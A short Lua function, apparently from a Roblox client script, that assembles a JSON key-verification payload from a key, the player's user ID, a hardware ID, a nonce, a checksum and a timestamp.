local function _buildKeyPayload(key)
	local _nonce=_buildNonce(os.clock())
	local _uid=_T(LocalPlayer.UserId)
	local _payload={
		key=key,
		uid=_uid,
		hwid=_hwid,
		nonce=_nonce,
		svc=_svcId,
		cs=_checksum(key.._uid.._nonce),
		ts=_T(_flr(os.clock()*1000))
	}
	return _jsonEncode(_payload)
end

